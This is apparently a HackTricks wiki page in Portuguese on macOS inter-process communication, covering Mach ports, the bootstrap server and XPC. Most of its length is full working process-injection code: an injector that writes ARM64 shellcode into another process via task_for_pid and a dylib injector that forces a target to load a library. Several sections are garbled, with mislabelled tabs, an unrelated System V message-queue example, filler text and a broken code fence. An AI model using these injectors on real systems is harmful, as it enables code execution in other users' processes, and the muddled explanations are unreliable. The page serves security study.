# IPC do macOS - Comunicação entre Processos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mensagens Mach via Portas

O Mach usa **tarefas** como a **unidade menor** para compartilhar recursos, e cada tarefa pode conter **várias threads**. Essas **tarefas e threads são mapeadas 1:1 para processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação Interprocesso (IPC) do Mach, utilizando canais de comunicação unidirecionais. **As mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.

Os direitos de porta, que definem quais operações uma tarefa pode executar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são:

* **Direito de recebimento**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de recebimento para cada porta** em todo o sistema (ao contrário dos pipes, onde vários processos podem ter descritores de arquivo para a extremidade de leitura de um pipe).
* Uma **tarefa com o direito de recebimento** pode receber mensagens e **criar direitos de envio**, permitindo que ela envie mensagens. Originalmente, apenas a **própria tarefa tem o direito de recebimento sobre sua porta**.
* **Direito de envio**, que permite enviar mensagens para a porta.
* **Direito de envio único**, que permite enviar uma mensagem para a porta e depois desaparece.
* **Direito de conjunto de porta**, que denota um _conjunto de porta_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Os conjuntos de portas podem ser usados para ouvir várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
* **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se transformam em nomes mortos.

**As tarefas podem transferir direitos de ENVIO para outros**, permitindo que eles enviem mensagens de volta. **Os direitos de ENVIO também podem ser clonados, para que uma tarefa possa duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

#### Etapas:

Como mencionado, para estabelecer o canal de comunicação, o **servidor de inicialização** (**launchd** no mac) está envolvido.

1. A tarefa **A** inicia uma **nova porta**, obtendo um **direito de RECEBIMENTO** no processo.
2. A tarefa **A**, sendo a detentora do direito de RECEBIMENTO, **gera um direito de ENVIO para a porta**.
3. A tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, fornecendo o **nome do serviço da porta** e o **direito de ENVIO** por meio de um procedimento conhecido como registro de inicialização.
4. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização para o serviço**. Se bem-sucedido, o **servidor duplica o direito de ENVIO** recebido da Tarefa A e **o transmite para a Tarefa B**.
5. Ao adquirir um direito de ENVIO, a tarefa **B** é capaz de **formular** uma **mensagem** e enviá-la **para a tarefa A**.

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **se passar por qualquer tarefa do sistema**, como falsamente **reivindicar um nome de serviço de autorização** e, em seguida, aprovar todas as solicitações.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios protegidos pelo SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Ao lado de cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **direito de RECEBIMENTO para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo procurado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

* A tarefa **B** inicia uma **busca de inicialização** para um nome de serviço.
* **launchd** verifica se a tarefa está em execução e, se não estiver, a **inicia**.
* A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização cria um direito de ENVIO, o retém e transfere o direito de RECEBIMENTO para a tarefa A**.
* launchd duplica o **direito de ENVIO e o envia para a tarefa B**.

No entanto, esse processo se aplica apenas a tarefas predefinidas do sistema. As tarefas não do sistema ainda operam como descrito originalmente, o que poderia permitir a falsificação.
### Exemplo de código

Observe como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de inicialização** enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% tab title="sender.c" %}
O arquivo `sender.c` é um exemplo de um processo que envia mensagens IPC para outro processo. Ele usa a função `msgsnd()` para enviar uma mensagem para a fila de mensagens IPC. A mensagem é composta por uma estrutura `msgbuf` que contém um tipo de mensagem e um corpo de mensagem. O tipo de mensagem é usado pelo receptor para identificar o tipo de mensagem que está recebendo. O corpo da mensagem pode conter qualquer dado que o remetente deseje enviar.

O processo remetente deve primeiro obter a chave da fila de mensagens IPC usando a função `ftok()`. Em seguida, ele deve criar a fila de mensagens IPC usando a função `msgget()`. Depois disso, ele pode enviar mensagens para a fila usando a função `msgsnd()`.

O código a seguir mostra como enviar uma mensagem IPC usando a função `msgsnd()`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define MAX_MSG_SIZE 1024

struct msgbuf {
    long mtype;
    char mtext[MAX_MSG_SIZE];
};

int main(int argc, char *argv[]) {
    key_t key;
    int msgid;
    struct msgbuf msg;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <key> <message>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    key = atoi(argv[1]);
    msgid = msgget(key, 0666 | IPC_CREAT);
    if (msgid == -1) {
        perror("msgget");
        exit(EXIT_FAILURE);
    }

    msg.mtype = 1;
    strncpy(msg.mtext, argv[2], MAX_MSG_SIZE);
    if (msgsnd(msgid, &msg, strlen(msg.mtext) + 1, 0) == -1) {
        perror("msgsnd");
        exit(EXIT_FAILURE);
    }

    printf("Sent message: %s\n", msg.mtext);

    exit(EXIT_SUCCESS);
}
```

Este código cria uma mensagem IPC com um tipo de mensagem de 1 e um corpo de mensagem especificado pelo segundo argumento da linha de comando. Ele envia a mensagem para a fila de mensagens IPC identificada pela chave especificada pelo primeiro argumento da linha de comando.
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Port Stealing

Port stealing is a technique that allows a process to take control of another process's task port. This can be used to elevate privileges or to bypass sandbox restrictions.

The basic idea is to create a new task with `fork()` and then perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) to replace the new task's task port with the target process's task port. Once this is done, the new task can control the target process.

Here's some example code that demonstrates port stealing:

{% tabs %}
{% tab title="port\_steal.c" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep
#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo] processIdentifier]);
[NSThread sleepForTimeInterval:99999];
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}

# Entitlements.plist

O arquivo `entitlements.plist` é um arquivo de propriedades que contém informações sobre as permissões e recursos que um aplicativo tem acesso. Ele é usado pelo macOS para verificar se um aplicativo tem permissão para acessar determinados recursos do sistema, como a câmera, o microfone ou a localização do usuário.

Os desenvolvedores podem especificar as permissões necessárias para seus aplicativos no arquivo `entitlements.plist`. Essas permissões são verificadas pelo sistema operacional quando o aplicativo é executado e, se o aplicativo não tiver as permissões necessárias, ele não poderá acessar os recursos correspondentes.

Os arquivos `entitlements.plist` são assinados digitalmente pelo desenvolvedor do aplicativo e verificados pelo sistema operacional durante a instalação do aplicativo. Isso garante que o arquivo não tenha sido modificado por terceiros e que as permissões especificadas sejam confiáveis.

Os arquivos `entitlements.plist` podem ser usados por atacantes para identificar quais permissões um aplicativo tem e quais recursos ele pode acessar. Isso pode ser útil para um atacante que está tentando explorar uma vulnerabilidade no aplicativo ou no sistema operacional.

Os arquivos `entitlements.plist` podem ser encontrados em vários locais no sistema de arquivos do macOS, incluindo dentro de pacotes de aplicativos e frameworks. Eles podem ser visualizados e editados usando o Xcode ou um editor de texto simples.

## Referências

- [Apple Developer Documentation: Entitlement Key Reference](https://developer.apple.com/documentation/bundleresources/entitlements)
- [Apple Developer Documentation: About App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compile** o programa anterior e adicione as **permissões** para poder injetar código com o mesmo usuário (caso contrário, você precisará usar o **sudo**).

<details>

<summary>injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid>", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pid-of-mysleep>
```
### Injeção de Processo Dylib via Porta de Tarefa

No macOS, as **threads** podem ser manipuladas via **Mach** ou usando a **API posix `pthread`**. A thread gerada na injeção anterior foi gerada usando a API Mach, portanto, **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque ele **não precisava trabalhar com APIs compatíveis com posix**, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar o shellcode**, ele deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Em seguida, este novo pthread pode **chamar dlopen** para **carregar nossa dylib** do sistema.

Você pode encontrar **exemplos de dylibs** em (por exemplo, aquele que gera um log e depois você pode ouvi-lo):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

"\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}
```if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread criado a partir da thread mach @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Escreva o shellcode na memória alocada
kr = mach_vm_write(remoteTask,                   // Porta da tarefa
remoteCode64,                 // Endereço virtual (destino)
(vm_address_t) injectedCode,  // Fonte
0xa9);                       // Comprimento da fonte


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Não foi possível escrever na memória da thread remota: Erro %s\n", mach_error_string(kr));
return (-3);
}


// Defina as permissões na memória de código alocada
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Não foi possível definir as permissões de memória para o código da thread remota: Erro %s\n", mach_error_string(kr));
return (-4);
}

// Defina as permissões na memória de pilha alocada
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Não foi possível definir as permissões de memória para a pilha da thread remota: Erro %s\n", mach_error_string(kr));
return (-4);
}


// Crie a thread para executar o shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // esta é a pilha real
//remoteStack64 -= 8;  // precisa de alinhamento de 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Pilha remota 64  0x%llx, Código remoto é %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Não foi possível criar a thread remota: erro %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Uso: %s _pid_ _ação_\n", argv[0]);
fprintf (stderr, "   _ação_: caminho para um dylib no disco\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib não encontrado\n");
}

}```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Injeção de Thread via porta de tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Informações básicas

XPC, que significa Comunicação Interprocessos XNU (o kernel usado pelo macOS), é um framework para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer **chamadas de método assíncronas seguras entre diferentes processos** no sistema. É uma parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos separados por privilégios** onde cada **componente** é executado com **apenas as permissões necessárias** para fazer seu trabalho, limitando assim o potencial de danos de um processo comprometido.

O XPC usa uma forma de Comunicação Interprocessos (IPC), que é um conjunto de métodos para diferentes programas em execução no mesmo sistema para enviar dados de ida e volta.

Os principais benefícios do XPC incluem:

1. **Segurança**: Ao separar o trabalho em diferentes processos, cada processo pode receber apenas as permissões necessárias. Isso significa que mesmo que um processo seja comprometido, ele tem capacidade limitada de causar danos.
2. **Estabilidade**: O XPC ajuda a isolar falhas no componente onde elas ocorrem. Se um processo falhar, ele pode ser reiniciado sem afetar o restante do sistema.
3. **Desempenho**: O XPC permite fácil concorrência, pois diferentes tarefas podem ser executadas simultaneamente em diferentes processos.

A única **desvantagem** é que **separar um aplicativo em vários processos** fazendo com que eles se comuniquem via XPC é **menos eficiente**. Mas nos sistemas de hoje isso é quase imperceptível e os benefícios são muito melhores.

Um exemplo pode ser visto no QuickTime Player, onde um componente que usa XPC é responsável pela decodificação de vídeo. O componente é especificamente projetado para realizar tarefas computacionais, portanto, no caso de uma violação, ele não forneceria nenhum ganho útil ao atacante, como acesso a arquivos ou à rede.

### Serviços XPC específicos do aplicativo

Os componentes XPC de um aplicativo estão **dentro do próprio aplicativo**. Por exemplo, no Safari, você pode encontrá-los em **`/Applications/Safari.app/Contents/XPCServices`**. Eles têm a extensão **`.xpc`** (como **`com.apple.Safari.SandboxBroker.xpc`**) e também são **bundles** com o binário principal dentro dele: `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker.xpc/Contents/MacOS/com.apple.Safari.SandboxBroker`

